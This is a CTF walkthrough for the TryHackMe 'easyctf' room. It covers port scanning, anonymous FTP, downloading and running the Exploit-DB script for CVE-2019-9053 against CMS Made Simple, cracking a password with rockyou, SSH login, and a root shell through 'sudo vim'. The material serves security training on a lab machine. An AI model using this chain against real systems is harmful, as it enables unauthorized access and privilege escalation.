All steps and concepts about CTF made on https://tryhackme.com/room/easyctf:

1 - Start Machine on tryhackme 

2 - Connect on VPN (download configuration file and connect via terminal)

3 - Ping IP to check if is connected

4 - PortScaning with 'nmap' command (check all ports ther are on server)

    sudo nmap -sV -A 10.10.193.189 (return softwares version and ports used)

5 - The PortScaning return ftp services is open anonymous, connect it

    ftp 10.10.193.189 / user anonymous

6 - Use dirb to list all path the server can have

    dirb http://10.10.193.189

7 - The http://10.10.193.189 is a server for a apache, and contain a site on /simple
    It's a "CMS Made Simple"

7 - Concept 'Exploit' - vunerabilitys documented and step-by-step to how hack anything , just seach for

    https://exploit-db.com

8 - Seach for CMS Made Simple and get the CVE - code vunerability on exploit-db 

    cve-2019-9053
    https://www.exploit-db.com/exploits/46635

9 - Copy the script and run on VirtualHost - Kali Linux

    wget https://www.exploit-db.com/raw/46635

10 - mv this file to a .py format and change permission 'chmod +x 46635.py'

11 - Observation: Kali Linux has a dicionary list on /usr/share/wordlists

    gunzip rockyou.txt.gz 

12 - Execute the .py file

    python 46635.py -u http://10.10.193.189/simple/ --crak -w /usr/share/wordlists/rockyou.txt 

13 - This returns password 'secret'

14 - It can be used to login on ssh 

    ssh mitch@10.10.193.189 -p 2222

15 - Check the executables softwares can user have 
 
    sudo -l

    (return vim)

16 - Execute it with privileges

    sudo vim -c ':!/bin/sh'

17 - Like root with 'whoami', get the user flag
